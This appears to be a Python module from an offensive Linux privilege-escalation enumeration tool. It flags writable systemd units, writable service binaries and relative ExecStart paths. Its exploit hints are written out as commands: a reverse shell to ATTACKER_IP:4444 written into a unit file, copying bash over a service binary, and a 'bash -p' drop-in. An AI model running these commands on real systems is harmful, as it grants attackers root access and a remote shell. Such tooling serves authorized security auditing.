"""
nullpeas/modules/systemd_enum.py
Analyzes systemd services for privilege escalation vectors.
"""

from typing import Dict, Any, List
from nullpeas.core.report import Report
from nullpeas.modules import register_module
from nullpeas.core.offensive_schema import (
    Primitive,
    PrimitiveConfidence,
    OffensiveValue,
    new_primitive_id,
)

def _build_service_primitive(unit: Dict[str, Any], p_type: str, user_name: str) -> Primitive:
    name = unit["name"]
    path = unit["path"]
    
    if p_type == "unit_write":
        desc = "Writable Systemd Unit File"
        vuln_resource = path
        severity = "Critical" # Direct root
        exploit_cmd = f"echo -e '[Service]\\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' > {path}"
        
    elif p_type == "binary_write":
        desc = "Writable Service Binary"
        vuln_resource = unit["exec_start"]
        severity = "High" # Requires service restart
        exploit_cmd = f"cp /bin/bash {vuln_resource}"
        
    elif p_type == "relative_path":
        desc = "Relative Path in Service ExecStart"
        vuln_resource = unit["exec_start"]
        severity = "High"
        exploit_cmd = f"echo -e '#!/bin/bash\\n/bin/bash -p' > ./{vuln_resource}"

    # Build the Primitive
    confidence = PrimitiveConfidence(
        score=9.0,
        reason=f"Verified write access to {vuln_resource} via os.access"
    )

    offensive_value = OffensiveValue(
        classification="severe",
        why=f"{desc} '{name}' allows executing arbitrary commands as root on service restart/boot."
    )

    return Primitive(
        id=new_primitive_id("systemd", p_type),
        surface="systemd",
        type=f"systemd_{p_type}",
        run_as="root", # Services run as root by default
        origin_user=user_name,
        exploitability="high",
        stability="risky", # Modifying services is noisy
        noise="noticeable",
        confidence=confidence,
        offensive_value=offensive_value,
        context={
            "unit_name": name,
            "unit_file_path": path,
            "exec_binary": unit["exec_start"],
            "exploit_hint": exploit_cmd
        },
        affected_resource=vuln_resource, # CRITICAL for Chaining
        integration_flags={
            "chaining_allowed": True,
            "requires_restart": True
        },
        module_source="systemd_enum",
        probe_source="systemd_probe",
    )

@register_module(
    key="systemd_enum",
    description="Analyze Systemd services for writable units and binaries",
    required_triggers=["systemd_files_present"], # We will add this trigger
)
def run(state: Dict[str, Any], report: Report):
    data = state.get("systemd", {})
    writable_units = data.get("writable_units", [])
    writable_binaries = data.get("writable_binaries", [])
    relative_paths = data.get("relative_paths", [])

    if not (writable_units or writable_binaries or relative_paths):
        return

    user = state.get("user", {})
    user_name = user.get("name", "current_user")
    primitives = state.setdefault("offensive_primitives", [])

    # Report Section
    lines = []
    lines.append("Analysis of Systemd Service Units.")
    lines.append("Writable units or binaries allow root privilege escalation upon service restart.")
    lines.append("")

    if writable_units:
        lines.append("#### 🚨 Writable Unit Files")
        for u in writable_units:
            lines.append(f"- `{u['path']}` (Modifying this = Root)")
            primitives.append(_build_service_primitive(u, "unit_write", user_name))

    if writable_binaries:
        lines.append("#### ⚠️ Writable Service Binaries")
        for u in writable_binaries:
            lines.append(f"- Service `{u['name']}` runs writable binary: `{u['exec_start']}`")
            primitives.append(_build_service_primitive(u, "binary_write", user_name))
            
    if relative_paths:
        lines.append("#### ⚠️ Relative Path Service Execution")
        for u in relative_paths:
            lines.append(f"- Service `{u['name']}` executes relative path: `{u['exec_start']}`")
            primitives.append(_build_service_primitive(u, "relative_path", user_name))

    report.add_section("Systemd Service Analysis", lines)
